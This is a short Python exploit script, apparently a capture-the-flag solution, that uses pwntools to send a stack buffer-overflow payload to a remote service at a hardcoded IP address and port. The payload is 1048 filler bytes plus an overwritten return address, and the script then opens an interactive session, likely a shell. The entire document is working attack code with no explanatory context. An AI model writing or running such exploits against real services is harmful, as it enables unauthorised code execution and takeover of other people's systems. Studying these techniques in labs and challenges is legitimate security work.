from pwn import *
payload = "A"*1048+"\xe7\x05\x40\x00\x00\x00\x00\x00"

p = remote('35.240.148.138', 7002)
p.sendline(payload)
p.interactive()
